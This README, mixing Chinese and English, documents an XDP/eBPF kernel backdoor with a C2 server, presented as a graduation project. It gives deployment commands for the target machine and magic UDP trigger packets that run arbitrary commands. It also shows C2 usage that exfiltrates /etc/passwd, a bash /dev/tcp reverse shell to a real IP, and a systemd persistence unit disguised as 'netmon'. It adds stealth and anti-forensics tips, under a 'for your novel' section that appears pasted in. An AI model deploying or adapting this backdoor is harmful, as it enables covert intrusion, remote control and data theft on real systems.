# XPD后门

## 说明
这是无开放端口的XDP后门，是毕业设计的一部分

## 部署
```bash

#安装头文件
apt install -y libbpf-dev linux-headers-$(uname -r)

# 编译
make

# 如果需要c2 server的话，使用下面命令编译，如果使用网页演示，通常不需要编译。
gcc c2_server.c -o c2_server -pthread

# 加载XDP程序

# Load into kernel
sudo ip link set dev eth0 xdp obj xdp_blackdoor.o sec xdp

# Pin the map to filesystem
sudo bpftool map pin name commands /sys/fs/bpf/blackdoor_commands

# Verify loaded
sudo bpftool prog show


# 开启用户空间命令执行agent

sudo ./c2_agent /sys/fs/bpf/blackdoor_commands
# Agent will daemonize - check with ps aux | grep c2_agent

```

## 部署后

向目标机器80端口发送数据字段为 Phantom2025!lsEND 格式的UDP数据包。
理论上是任何端口，无论是否开放。但是该端口必须未被云服务器提供商所拦截    
保证data字段的长度是200字节。  
命令前增加 & 会告知服务器创建一个线程来执行可能被阻塞的命令。  
目标机器会执行其中包含的任意指令



# Complete C2 System Deployment Guide

## Architecture Overview

```
[Operator] ──UDP magic packet──> [Target:111]
                                       │
                                   [XDP Hook]
                                       │
                                  [eBPF Map]
                                       │
                                [Userspace Agent]
                                       │
                              [Execute Command]
                                       │
[Operator] <──TCP exfil (port 666)────┘
```

## Components

### 1. Kernel Component: `xdp_blackdoor_s1mple.c`
- XDP eBPF program attached to network interface
- Filters UDP packets on specified port (default: 111)
- Magic packet format: `HACKE_BY_PUTAO [command] END` (200 bytes total)
- Drops activation packet for stealth
- Stores command in eBPF map

### 2. Userspace Agent: `c2_agent_userspace.c`
- Polls eBPF map every 2 seconds
- Executes commands via `popen()`
- Exfiltrates output to C2 server via TCP
- Runs as daemon (detached from terminal)

### 3. C2 Server: `c2_server.c`
- Interactive operator shell
- Crafts magic UDP packets with embedded commands
- Listens for agent output on TCP port 666
- Multi-threaded (command send + output receive)

## Compilation

### Kernel Component (on target)
```bash
make
```

```bash
# 不要用这个。请使用make命令编译，否则会缺失头文件。
clang -O2 -target bpf -c xdp_blackdoor_s1mple.c -o xdp_blackdoor.o
```


### Userspace Agent (on target)
```bash
# make 命令后已经编译了，所以也不用额外运行。
gcc c2_agent_userspace.c -lbpf -o c2_agent
```

### C2 Server (on operator machine)
```bash
gcc c2_server.c -o c2_server -pthread
```

## Deployment

### On Target Machine

**1. Load XDP program**
```bash
# Load into kernel
sudo ip link set dev eth0 xdp obj xdp_blackdoor.o sec xdp

# Pin the map to filesystem
sudo bpftool map pin name commands /sys/fs/bpf/blackdoor_commands

# Verify loaded
sudo bpftool prog show
```

**2. Start userspace agent**
```bash
sudo ./c2_agent /sys/fs/bpf/blackdoor_commands
# Agent will daemonize - check with ps aux | grep c2_agent
```

### On Operator Machine

**Start C2 server**
```bash
./c2_server
```

**Interactive commands:**
```
c2> set target 192.168.75.133 80      # Set target IP and port
c2> exec whoami                        # Execute command
c2> exec cat /etc/passwd               # Exfiltrate files
c2> shell 192.168.75.128               # Full reverse shell
```

## Testing

###可用的nc回连命令
攻击机
nc -l -p 2222
靶机
/bin/bash -i >& /dev/tcp/38.207.189.106/2222 0>&1 

发送数据字段为 Phantom2025!lsEND 格式的UDP数据包。保证data字段的长度是200字节。
命令前增加 & 会告知服务器创建一个线程来执行可能被阻塞的命令。



### Packet structure verification:

### Check kernel logs on target:
```bash
sudo cat /sys/kernel/debug/tracing/trace_pipe | grep blackdoor
```

Expected output:
```
[blackdoor] Found activation packet! END at position: 17
[blackdoor] Extracted command: id
```

## Stealth Features

- **Kernel-level filtering**: Processes packets before userspace sees them
- **Packet dropping**: Activation packets disappear from network stack
- **No listening ports**: Agent doesn't bind to any port (passive polling)
- **Legitimate traffic mimicry**: Uses common ports (80, 443)
- **Daemon operation**: No terminal attachment, minimal process visibility

## Advanced Enhancements (for your novel)

### Encryption Layer
Replace plaintext with AES-encrypted payloads:
```c
// In kernel: decrypt magic packet with shared key
// In server: encrypt commands before sending
```

### Domain Fronting
Route C2 traffic through CDN to mask true destination.

### Covert Channels
- ICMP tunnel (ping with encoded data in payload)
- DNS tunneling (commands in TXT records)
- HTTP steganography (commands in image EXIF data)

### Persistence
```bash
# Add to systemd service
cat > /etc/systemd/system/netmon.service <<EOF
[Unit]
Description=Network Monitor
After=network.target

[Service]
ExecStart=/usr/local/bin/c2_agent /sys/fs/bpf/blackdoor_commands
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable netmon
```

### Anti-Forensics
- Memory-only execution (no disk artifacts)
- Polymorphic magic strings (rotate HACKE_BY_PUTAO)
- Command history sanitization
- Log file purging after execution

## Narrative Integration Points

- **Discovery**: SOC analyst notices anomalous UDP traffic patterns
- **Escalation**: Memory forensics reveals XDP program attached to interface
- **Cat-and-mouse**: Attacker rotates magic strings, defender updates signatures
- **Climax**: Target unplugs network cable, breaking C2 link at critical moment

## References
- eBPF XDP: https://www.kernel.org/doc/html/latest/bpf/index.html
- libbpf: https://github.com/libbpf/libbpf
- C2 frameworks: Cobalt Strike, Metasploit, Sliver
